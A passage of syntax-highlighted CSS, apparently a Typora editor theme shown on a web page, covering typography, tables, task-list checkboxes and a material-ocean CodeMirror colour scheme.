&#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-family</span>: <span class=\"string\">&#x27;Lexend&#x27;</span>,<span class=\"string\">&#x27;SourceCodePro&#x27;</span>,<span class=\"string\">&#x27;NotoSansSC&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">font-weight</span>: normal;</span><br><span class=\"line\">\t<span class=\"attribute\">line-height</span>: <span class=\"number\">1.5rem</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">letter-spacing</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-id\">#write</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">max-width</span>: <span class=\"number\">900px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">padding</span>: <span class=\"number\">30px</span> <span class=\"number\">50px</span> <span class=\"number\">20px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-id\">#write</span> <span class=\"selector-tag\">p</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">text-align</span><span class=\"selector-pseudo\">:left</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-id\">#write</span> pre<span class=\"selector-class\">.md-meta-block</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">padding</span>: <span class=\"number\">1rem</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">font-size</span>: <span class=\"number\">85%</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">line-height</span>: <span class=\"number\">1.45</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>: <span class=\"number\">#ffffff</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">border</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">border-radius</span>: <span class=\"number\">3px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">color</span>: <span class=\"number\">#141414</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin-top</span>: <span class=\"number\">0</span> <span class=\"meta\">!important</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.md-image</span>&gt;<span class=\"selector-class\">.md-meta</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#141414</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">0.9rem</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">font-family</span>: <span class=\"string\">&#x27;Lexend&#x27;</span>;</span><br><span class=\"line\">    <span class=\"attribute\">padding</span>: <span class=\"number\">4px</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> print &#123;</span><br><span class=\"line\">  <span class=\"selector-tag\">html</span>,<span class=\"selector-tag\">body</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">14px</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-tag\">table</span>,</span><br><span class=\"line\">  pre &#123;</span><br><span class=\"line\">    <span class=\"attribute\">page-break-inside</span>: avoid;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  pre &#123;</span><br><span class=\"line\">    <span class=\"attribute\">word-wrap</span>: break-word;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">@page</span> &#123;</span><br><span class=\"line\">  size: A4; </span><br><span class=\"line\">  <span class=\"attribute\">margin</span>: <span class=\"number\">8mm</span> <span class=\"number\">0mm</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*toc*/</span></span><br><span class=\"line\"><span class=\"selector-class\">.md-toc</span> &#123; </span><br><span class=\"line\">    <span class=\"attribute\">margin-top</span>:<span class=\"number\">20px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">padding-bottom</span>:<span class=\"number\">20px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--deep-theme-color);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">a</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--deep-theme-color);</span><br><span class=\"line\">\t<span class=\"attribute\">text-decoration</span>: none;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">a</span><span class=\"selector-pseudo\">:hover</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">text-decoration</span>: underline;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*headers*/</span></span><br><span class=\"line\"><span class=\"selector-tag\">h1</span>,<span class=\"selector-tag\">h2</span>,<span class=\"selector-tag\">h3</span>,<span class=\"selector-tag\">h4</span>,<span class=\"selector-tag\">h5</span>,<span class=\"selector-tag\">h6</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">display</span>: block;</span><br><span class=\"line\">\t<span class=\"attribute\">font-weight</span>:bold;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">h1</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">font-size</span>: <span class=\"number\">2em</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin-top</span>: <span class=\"number\">0.67em</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin-bottom</span>: <span class=\"number\">0.67em</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">h2</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">font-size</span>: <span class=\"number\">1.5em</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin-top</span>: <span class=\"number\">0.83em</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin-bottom</span>: <span class=\"number\">0.83em</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">h3</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">font-size</span>: <span class=\"number\">1.17em</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin-top</span>: <span class=\"number\">1em</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin-bottom</span>: <span class=\"number\">1em</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">h4</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">font-size</span>: <span class=\"number\">1em</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin-top</span>: <span class=\"number\">1.33em</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin-bottom</span>: <span class=\"number\">1.33em</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">h5</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">font-size</span>: <span class=\"number\">1em</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin-top</span>: <span class=\"number\">1.33em</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin-bottom</span>: <span class=\"number\">1.33em</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">color</span>: <span class=\"number\">#777777</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">h6</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">font-size</span>: <span class=\"number\">1em</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin-top</span>: <span class=\"number\">1.33em</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin-bottom</span>: <span class=\"number\">1.33em</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">color</span>: <span class=\"number\">#adadad</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">p</span>,</span><br><span class=\"line\"><span class=\"selector-tag\">blockquote</span>,</span><br><span class=\"line\"><span class=\"selector-tag\">ul</span>,</span><br><span class=\"line\"><span class=\"selector-tag\">ol</span>,</span><br><span class=\"line\"><span class=\"selector-tag\">dl</span>,</span><br><span class=\"line\"><span class=\"selector-tag\">table</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">margin</span>: <span class=\"number\">0.8rem</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*table*/</span></span><br><span class=\"line\"><span class=\"selector-tag\">table</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">border-collapse</span>: collapse;</span><br><span class=\"line\">\t<span class=\"attribute\">padding</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">word-break</span>: initial;</span><br><span class=\"line\">\t<span class=\"attribute\">table-layout</span>: fixed;</span><br><span class=\"line\">\t<span class=\"attribute\">width</span>: <span class=\"number\">100%</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">table</span> <span class=\"selector-tag\">tr</span><span class=\"selector-pseudo\">:nth-child</span>(even)&#123;</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: <span class=\"built_in\">var</span>(--table-even-row-color);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">thead</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>: <span class=\"built_in\">var</span>(--table-head-color);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">table</span> <span class=\"selector-tag\">th</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">text-align</span>: center;</span><br><span class=\"line\">\t<span class=\"attribute\">padding</span>:<span class=\"number\">6px</span> <span class=\"number\">13px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">border</span>: <span class=\"number\">1px</span> solid <span class=\"built_in\">var</span>(--table-head-color);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">table</span> <span class=\"selector-tag\">td</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">padding</span>:<span class=\"number\">6px</span> <span class=\"number\">13px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">border</span>: <span class=\"number\">1px</span> solid <span class=\"built_in\">var</span>(--table-head-color);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">table</span> <span class=\"selector-tag\">tr</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">padding</span>:<span class=\"number\">6px</span> <span class=\"number\">13px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">border</span>: <span class=\"number\">1px</span> solid <span class=\"built_in\">var</span>(--table-head-color);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*blockquote*/</span></span><br><span class=\"line\"><span class=\"selector-tag\">blockquote</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">border-left</span>: <span class=\"number\">0.2rem</span> solid <span class=\"built_in\">var</span>(--side-bar-bg-color);</span><br><span class=\"line\">\t<span class=\"attribute\">color</span>: <span class=\"number\">#b4d8e9</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">font-family</span>: <span class=\"string\">&#x27;Lexend&#x27;</span>,<span class=\"string\">&#x27;NotoSansSC&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">font-size</span>: <span class=\"number\">0.9rem</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">padding-left</span>: <span class=\"number\">2rem</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*list*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">li</span> <span class=\"selector-tag\">p</span><span class=\"selector-class\">.first</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">display</span>: inline-block;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">ul</span>,</span><br><span class=\"line\"><span class=\"selector-tag\">ol</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">padding-left</span>: <span class=\"number\">30px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">ul</span><span class=\"selector-pseudo\">:first</span>-child,</span><br><span class=\"line\"><span class=\"selector-tag\">ol</span><span class=\"selector-pseudo\">:first</span>-child &#123;</span><br><span class=\"line\">    <span class=\"attribute\">margin-top</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">ul</span><span class=\"selector-pseudo\">:last-child</span>,</span><br><span class=\"line\"><span class=\"selector-tag\">ol</span><span class=\"selector-pseudo\">:last-child</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">margin-bottom</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.md-task-list-item</span><span class=\"selector-pseudo\">:hover</span> &gt; <span class=\"selector-tag\">input</span>:before,</span><br><span class=\"line\">input[type=<span class=\"string\">&#x27;checkbox&#x27;</span>]:hover:before &#123;</span><br><span class=\"line\">\topacity: <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">transition</span>: <span class=\"number\">0.5s</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>: <span class=\"built_in\">var</span>(--side-bar-bg-color);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.task-list-item</span> <span class=\"selector-tag\">input</span><span class=\"selector-pseudo\">::before</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">content</span>: <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">    <span class=\"attribute\">display</span>: inline-block;</span><br><span class=\"line\">\t<span class=\"attribute\">border-radius</span>: <span class=\"number\">1.1rem</span>;</span><br><span class=\"line\">    <span class=\"attribute\">vertical-align</span>: middle;</span><br><span class=\"line\">    <span class=\"attribute\">border</span>: <span class=\"number\">1.2px</span> solid <span class=\"built_in\">var</span>(--deep-theme-color);</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: <span class=\"number\">#ffffff</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">width</span>: <span class=\"number\">1.1rem</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">1.1rem</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin-left</span>: -<span class=\"number\">0.1rem</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin-right</span>: <span class=\"number\">0.1rem</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin-top</span>: -<span class=\"number\">0.68rem</span>; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.task-list-item</span> <span class=\"selector-tag\">input</span><span class=\"selector-pseudo\">:checked</span><span class=\"selector-pseudo\">::before</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">padding-left</span>: <span class=\"number\">0.125em</span>;</span><br><span class=\"line\">    <span class=\"attribute\">content</span>: <span class=\"string\">&#x27;✔&#x27;</span>;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>:white;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>: <span class=\"built_in\">var</span>(--deep-theme-color);</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">0.8rem</span>;</span><br><span class=\"line\">    <span class=\"attribute\">line-height</span>: <span class=\"number\">0.95rem</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin-top</span>: -<span class=\"number\">0.68rem</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">transition</span>: background-color <span class=\"number\">200ms</span> ease-in-out;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.task-list-done</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">text-decoration</span>: line-through;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#343a41</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">hr &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">border-style</span>: none;</span><br><span class=\"line\">    <span class=\"attribute\">border-top-style</span>: solid;</span><br><span class=\"line\">    <span class=\"attribute\">border-color</span>: <span class=\"number\">#e7e7e7</span>;</span><br><span class=\"line\">    <span class=\"attribute\">border-width</span>: <span class=\"number\">1px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin</span>: <span class=\"number\">2rem</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*highlight*/</span></span><br><span class=\"line\"><span class=\"selector-id\">#write</span> <span class=\"selector-tag\">mark</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>: <span class=\"number\">#c7ffe8</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">border-radius</span>: <span class=\"number\">2px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">color</span>: <span class=\"built_in\">rgb</span>(<span class=\"number\">44</span>, <span class=\"number\">39</span>, <span class=\"number\">39</span>);</span><br><span class=\"line\">\t<span class=\"attribute\">padding</span>: <span class=\"number\">0</span> <span class=\"number\">4px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin</span>: <span class=\"number\">0</span> <span class=\"number\">2px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*inline code*/</span></span><br><span class=\"line\"><span class=\"selector-id\">#write</span> <span class=\"selector-tag\">code</span>,tt &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">padding</span>: <span class=\"number\">0.6px</span> <span class=\"number\">4px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">border-radius</span>: <span class=\"number\">2px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>: <span class=\"built_in\">rgba</span>(<span class=\"number\">238</span>, <span class=\"number\">238</span>, <span class=\"number\">238</span>, <span class=\"number\">0.39</span>);</span><br><span class=\"line\">\t<span class=\"attribute\">font-family</span>: <span class=\"string\">&#x27;SourceCodePro&#x27;</span>,Consolas,Courier, Monospace;</span><br><span class=\"line\">\t<span class=\"attribute\">font-size</span>: <span class=\"number\">0.9rem</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">color</span>: <span class=\"number\">#666666</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin</span>: <span class=\"number\">0</span> <span class=\"number\">2px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*footnote*/</span></span><br><span class=\"line\"><span class=\"selector-id\">#write</span> <span class=\"selector-class\">.md-footnote</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">color</span>: <span class=\"number\">#343a41</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>: <span class=\"number\">#e4e4e4</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*source code mode*/</span></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-typora-default</span> <span class=\"selector-class\">.cm-header</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">color</span>: <span class=\"number\">#524a4a</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-typora-default</span> <span class=\"selector-class\">.cm-link</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">color</span>:<span class=\"built_in\">var</span>(--deep-theme-color);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*code block*/</span></span><br><span class=\"line\"><span class=\"selector-id\">#write</span> <span class=\"selector-class\">.md-fences</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">1rem</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin</span>: <span class=\"number\">0.2em</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">padding</span>: <span class=\"number\">0.5em</span>;</span><br><span class=\"line\">    <span class=\"attribute\">border-radius</span>: <span class=\"number\">3px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">font-size</span>: <span class=\"number\">0.9em</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-family</span>: <span class=\"string\">&#x27;SourceCodePro&#x27;</span>,Consolas,Courier, Monospace ;</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: <span class=\"number\">#fffdfd</span>;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#a3a3a3</span>;</span><br><span class=\"line\">    <span class=\"attribute\">border</span>: none;</span><br><span class=\"line\">\t<span class=\"attribute\">text-shadow</span>: none;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.md-fences</span> <span class=\"selector-class\">.code-tooltip</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>: <span class=\"number\">#ffffff</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">  Name:       material-ocean</span></span><br><span class=\"line\"><span class=\"comment\">  Author:     Mattia Astorino (http://github.com/equinusocio)</span></span><br><span class=\"line\"><span class=\"comment\">  Website:    https://material-theme.site/</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span><span class=\"selector-class\">.CodeMirror</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: <span class=\"number\">#ffffff</span>;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#343a41</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*.cm-s-inner .CodeMirror-gutters &#123;</span></span><br><span class=\"line\"><span class=\"comment\">  background: #ffffff;</span></span><br><span class=\"line\"><span class=\"comment\">  color: #ffffff;</span></span><br><span class=\"line\"><span class=\"comment\">  border: none;</span></span><br><span class=\"line\"><span class=\"comment\">&#125;</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.CodeMirror-linenumber</span> &#123;<span class=\"attribute\">color</span>: <span class=\"number\">#343a41</span>;&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.CodeMirror-guttermarker</span> &#123; <span class=\"attribute\">color</span>: <span class=\"number\">#FFEE80</span>; &#125;</span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.CodeMirror-guttermarker-subtle</span> &#123; <span class=\"attribute\">color</span>: <span class=\"number\">#D0D0D0</span>; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">.cm-s-inner .CodeMirror-cursor &#123;</span></span><br><span class=\"line\"><span class=\"comment\">  border-left: 1px solid #FFCC00;</span></span><br><span class=\"line\"><span class=\"comment\">&#125;</span></span><br><span class=\"line\"><span class=\"comment\">.cm-s-inner.cm-fat-cursor .CodeMirror-cursor &#123;</span></span><br><span class=\"line\"><span class=\"comment\">  background-color: #FFCC00 !important;</span></span><br><span class=\"line\"><span class=\"comment\">&#125;</span></span><br><span class=\"line\"><span class=\"comment\">.cm-s-inner .cm-animate-fat-cursor &#123;</span></span><br><span class=\"line\"><span class=\"comment\">  background-color: #FFCC00 !important;</span></span><br><span class=\"line\"><span class=\"comment\">&#125;</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.CodeMirror-cursor</span> &#123; <span class=\"attribute\">border-left</span>: <span class=\"number\">1px</span> solid <span class=\"number\">#A9B7C6</span>; &#125;</span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-tag\">div</span><span class=\"selector-class\">.CodeMirror-cursor</span> &#123; <span class=\"attribute\">border-left</span>: <span class=\"number\">1px</span> solid <span class=\"number\">#ffffff</span>; &#125;</span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-tag\">div</span><span class=\"selector-class\">.CodeMirror-selected</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">background</span>: <span class=\"built_in\">rgba</span>(<span class=\"number\">58</span>, <span class=\"number\">58</span>, <span class=\"number\">59</span>, <span class=\"number\">0.2</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span><span class=\"selector-class\">.CodeMirror-focused</span> <span class=\"selector-tag\">div</span><span class=\"selector-class\">.CodeMirror-selected</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">background</span>: <span class=\"built_in\">rgba</span>(<span class=\"number\">221</span>, <span class=\"number\">224</span>, <span class=\"number\">241</span>, <span class=\"number\">0.2</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.CodeMirror-selected</span>&#123; <span class=\"attribute\">background</span>: <span class=\"number\">#d6dce7</span> <span class=\"meta\">!important</span>; &#125;</span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.CodeMirror-selectedtext</span> &#123; <span class=\"attribute\">background</span>: <span class=\"number\">#dbdee6</span> <span class=\"meta\">!important</span>; &#125;</span><br><span class=\"line\"><span class=\"selector-class\">.cm-overlay</span><span class=\"selector-class\">.CodeMirror-selectedtext</span> &#123; <span class=\"attribute\">background</span>: <span class=\"number\">#B5D6FC</span> <span class=\"meta\">!important</span>; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.CodeMirror-line</span><span class=\"selector-pseudo\">::selection</span>,</span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.CodeMirror-line</span>&gt;<span class=\"selector-tag\">span</span><span class=\"selector-pseudo\">::selection</span>,</span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.CodeMirror-line</span>&gt;<span class=\"selector-tag\">span</span>&gt;<span class=\"selector-tag\">span</span><span class=\"selector-pseudo\">::selection</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">background</span>: <span class=\"built_in\">rgba</span>(<span class=\"number\">221</span>, <span class=\"number\">224</span>, <span class=\"number\">241</span>, <span class=\"number\">0.2</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.CodeMirror-line</span>::-moz-selection,</span><br><span class=\"line\">.cm-s-inner .CodeMirror-line&gt;span::-moz-selection,</span><br><span class=\"line\">.cm-s-inner .CodeMirror-line&gt;span&gt;span::-moz-selection &#123;</span><br><span class=\"line\">  background: <span class=\"built_in\">rgba</span>(<span class=\"number\">221</span>, <span class=\"number\">224</span>, <span class=\"number\">241</span>, <span class=\"number\">0.2</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.CodeMirror-activeline-background</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">background</span>: <span class=\"number\">#ffffff</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-keyword</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#8979c0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-operator</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#25c494</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-variable-2</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#4f5481</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-variable-3</span>,</span><br><span class=\"line\"><span class=\"selector-class\">.cm-s-inner</span> <span class=\"selector-class\">.cm-type</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span 